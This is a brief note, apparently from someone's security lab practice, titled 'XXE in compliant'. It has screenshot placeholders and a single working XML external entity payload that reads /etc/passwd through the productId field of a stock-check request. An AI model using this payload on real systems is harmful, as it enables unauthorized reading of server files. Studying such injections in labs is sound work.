# XXE in compliant 
![[Pasted image 20230224014753.png]]
![[Pasted image 20230224014811.png]]
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxeefowj SYSTEM "file:///etc/passwd">]><stockCheck><productId>1&xxeefowj;</productId><storeId>1</storeId></stockCheck> 
```
![[Pasted image 20230224014857.png]]
